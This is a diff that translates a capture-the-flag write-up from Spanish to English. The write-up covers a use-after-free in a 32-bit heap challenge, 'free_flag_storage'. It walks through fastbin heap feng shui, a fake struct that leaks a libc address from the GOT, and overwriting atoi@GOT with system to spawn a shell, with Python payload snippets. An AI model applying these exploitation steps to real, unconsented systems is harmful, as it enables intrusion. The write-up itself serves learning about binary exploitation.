@@ -25,7 +25,7 @@ PIE:        No PIE (0x8048000) <- Fixed addresses
 ```
 
 ### Struct Layout
-El programa maneja "flags" con la siguiente estructura (16 bytes):
+The program manages "flags" with the following structure (16 bytes):
 ```c
 struct flag {
     uint32_t length;      // offset 0x00
@@ -43,16 +43,16 @@ atoi@GOT:     0x804b034
 ```
 
 ### Commands
-- `add` - Crea un nuevo flag (malloc struct + malloc value)
-- `edit` - Edita un flag existente (escribe a value_ptr)
-- `delete` - Elimina un flag (free value, free struct)
-- `print` - Muestra todos los flags
+- `add` - Creates a new flag (malloc struct + malloc value)
+- `edit` - Edits an existing flag (writes to value_ptr)
+- `delete` - Deletes a flag (free value, free struct)
+- `print` - Shows all flags
 
 ---
 
 ## Vulnerability: Use-After-Free
 
-La función `delete()` libera la memoria pero **NO pone el puntero a NULL**:
+The `delete()` function frees memory but does **NOT set the pointer to NULL**:
 
 ```c
 void delete(int idx) {
@@ -63,9 +63,9 @@ void delete(int idx) {
 }
 ```
 
-Esto permite:
-1. Acceder a memoria liberada a través del puntero dangling
-2. Crear overlaps entre diferentes allocations
+This allows:
+1. Access freed memory through the dangling pointer
+2. Create overlaps between different allocations
 
 ---
 
@@ -73,74 +73,74 @@ Esto permite:
 
 ### 1. Heap Feng Shui
 
-**Objetivo**: Hacer que el `value` buffer de un nuevo flag se aloje en la ubicación de un `struct` anterior.
+**Goal**: Make the `value` buffer of a new flag be allocated in the location of a previous `struct`.
 
 ```
-Paso 1: Crear 3 flags con values de 8 bytes
+Step 1: Create 3 flags with 8-byte values
 - flag0: struct0 (24-byte chunk), value0 (16-byte chunk)
 - flag1: struct1 (24-byte chunk), value1 (16-byte chunk)
 - flag2: struct2 (24-byte chunk), value2 (16-byte chunk)
 
-Paso 2: Delete flag0 y flag1
+Step 2: Delete flag0 and flag1
 - fastbin-24: struct1 -> struct0
 - fastbin-16: value1 -> value0
-- flags[0] y flags[1] son dangling pointers!
+- flags[0] and flags[1] are dangling pointers!
 
-Paso 3: Add nuevo flag con value de 16 bytes (= 24-byte chunk)
-- malloc(struct) = struct1 (de fastbin-24)
-- malloc(value)  = struct0 (de fastbin-24!)
-- Ahora: value3 está en la ubicación de struct0
-- Y flags[0] aún apunta a struct0 = value3!
+Step 3: Add new flag with 16-byte value (= 24-byte chunk)
+- malloc(struct) = struct1 (from fastbin-24)
+- malloc(value)  = struct0 (from fastbin-24!)
+- Now: value3 is at the location of struct0
+- And flags[0] still points to struct0 = value3!
 ```
 
 ### 2. Leak libc
 
-Escribimos un **fake struct** como el value del nuevo flag:
+We write a **fake struct** as the value of the new flag:
 ```python
 fake_struct = p32(5) + p32(puts_got) + p32(0xcafe) + p32(0xbabe)
 #             length   value_ptr      cid           score
 ```
 
-Cuando `print` lee `flags[0]`:
-- Lee nuestro fake struct (porque flags[0] -> struct0 = value3)
+When `print` reads `flags[0]`:
+- It reads our fake struct (because flags[0] -> struct0 = value3)
 - `value_ptr = puts@GOT`
-- Imprime el contenido de puts@GOT = dirección de puts en libc
+- Prints the contents of puts@GOT = address of puts in libc
 
 ### 3. GOT Overwrite
 
-Actualizamos el fake struct para apuntar a `atoi@GOT`:
+We update the fake struct to point to `atoi@GOT`:
 ```python
 edit(1, p32(5) + p32(atoi_got) + p32(0xdead) + p32(0xbeef), 16)
 ```
 
-Luego `edit(0)` escribe a `atoi@GOT`:
+Then `edit(0)` writes to `atoi@GOT`:
 ```python
 p.send(p32(system_addr) + b'X')  # 5 bytes
 ```
 
 ### 4. Shell
 
-Después del overwrite, `atoi@GOT = system`. Cuando el programa pide el nuevo `challenge_id`:
+After the overwrite, `atoi@GOT = system`. When the program asks for the new `challenge_id`:
 ```python
 p.sendline(b'sh')  # atoi("sh") = system("sh") -> SHELL!
 ```
 
 ---
 
-## El Bug Crítico: NULL Byte Corruption
+## The Critical Bug: NULL Byte Corruption
 
-### El Problema
+### The Problem
 
-Durante el debugging, el exploit fallaba con:
+During debugging, the exploit was failing with:
 ```
 SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0xdc5430}
 ```
 
-La dirección `0xdc5430` son solo 3 bytes de `0xf7dc5430` - faltaba el MSB!
+The address `0xdc5430` is only 3 bytes of `0xf7dc5430` - the MSB was missing!
 
-### Causa Root
+### Root Cause
 
-En el disassembly de `edit()`:
+In the disassembly of `edit()`:
 ```asm
 8048b22:  mov    -0x14(%ebp),%edx    ; bytes_read
 8048b25:  sub    $0x1,%edx           ; bytes_read - 1
@@ -148,32 +148,32 @@ En el disassembly de `edit()`:
 8048b2a:  movb   $0x0,(%eax)         ; WRITE NULL BYTE!
 ```
 
-El programa escribe un **NULL byte al final del valor** para null-terminar el string:
+The program writes a **NULL byte at the end of the value** to null-terminate the string:
 ```
 position = value_ptr + bytes_read - 1
 *position = 0x00
 ```
 
-Con `length=4` y `value_ptr=atoi@GOT`:
-- Lee 4 bytes de system address
-- Escribe NULL en `atoi@GOT + 4 - 1 = atoi@GOT + 3`
-- **¡Corrompe el MSB de nuestra dirección!**
+With `length=4` and `value_ptr=atoi@GOT`:
+- Reads 4 bytes of system address
+- Writes NULL at `atoi@GOT + 4 - 1 = atoi@GOT + 3`
+- **Corrupts the MSB of our address!**
 
 `0xf7dc5430` → `0x00dc5430` → SIGSEGV
 
-### La Solución
+### The Solution
 
-Usar `length=5` en lugar de `length=4`:
+Use `length=5` instead of `length=4`:
 ```python
 fake_struct = p32(5) + p32(atoi_got) + ...
 #                 ↑ 5 bytes!
 ```
 
-Ahora:
-- Lee 5 bytes (4 de system + 1 dummy)
-- Escribe NULL en `atoi@GOT + 5 - 1 = atoi@GOT + 4`
-- El NULL va **después** de los 4 bytes importantes
-- `atoi@GOT` mantiene `0xf7dc5430` intacto!
+Now:
+- Reads 5 bytes (4 from system + 1 dummy)
+- Writes NULL at `atoi@GOT + 5 - 1 = atoi@GOT + 4`
+- The NULL goes **after** the 4 important bytes
+- `atoi@GOT` keeps `0xf7dc5430` intact!
 
 ---
 
@@ -202,8 +202,8 @@ system: 0x3cd10
 
 ## Exploit Files
 
-- `free_flag_storage_solve.py` - Exploit final funcional
-- `free_flag_storage` - Binary del challenge
+- `free_flag_storage_solve.py` - Final working exploit
+- `free_flag_storage` - Challenge binary
 
 ## Usage
 
@@ -217,24 +217,24 @@ python3 free_flag_storage_solve.py REMOTE
 
 ---
 
-## Timeline de Debug
+## Debug Timeline
 
-1. [OK] Confirmado UAF: despues de delete+add, ambos flags muestran mismo contenido
-2. [OK] Leak funciona: leemos puts@libc correctamente
-3. [OK] Fake struct funciona: cid=0xdead confirma que se lee nuestro struct
-4. [FAIL] Shell no spawneaba: SIGSEGV con direccion truncada
-5. [DEBUG] strace revelo: `read(0, "0T\334\367", 4) = 4` - lectura correcta
-6. [DEBUG] Pero SIGSEGV en `0xdc5430` - solo 3 bytes
-7. [INFO] Disasm revelo: `movb $0x0,(%eax)` escribe NULL al final
-8. [OK] Fix: length=5 evita corrupcion del MSB
-9. [DONE] Shell funciona!
+1. [OK] Confirmed UAF: after delete+add, both flags show the same content
+2. [OK] Leak works: we read puts@libc correctly
+3. [OK] Fake struct works: cid=0xdead confirms our struct is being read
+4. [FAIL] Shell was not spawning: SIGSEGV with truncated address
+5. [DEBUG] strace revealed: `read(0, "0T\334\367", 4) = 4` - correct read
+6. [DEBUG] But SIGSEGV at `0xdc5430` - only 3 bytes
+7. [INFO] Disasm revealed: `movb $0x0,(%eax)` writes NULL at the end
+8. [OK] Fix: length=5 avoids MSB corruption
+9. [DONE] Shell works!
 
 ---
 
-## Aprendizaje del reto
+## Lessons Learned
 
-1. **UAF clásico**: delete sin NULL permite acceso a memoria liberada
-2. **Heap feng shui**: Controlar qué memoria se reutiliza
-3. **Arbitrary read/write**: Fake struct con value_ptr controlado
-4. **GOT overwrite**: Partial RELRO permite sobrescribir GOT
-5. **Off-by-one NULL**: Siempre considerar null-termination en exploits
+1. **Classic UAF**: delete without NULL allows access to freed memory
+2. **Heap feng shui**: Controlling which memory gets reused
+3. **Arbitrary read/write**: Fake struct with controlled value_ptr
+4. **GOT overwrite**: Partial RELRO allows overwriting GOT
+5. **Off-by-one NULL**: Always consider null-termination in exploits
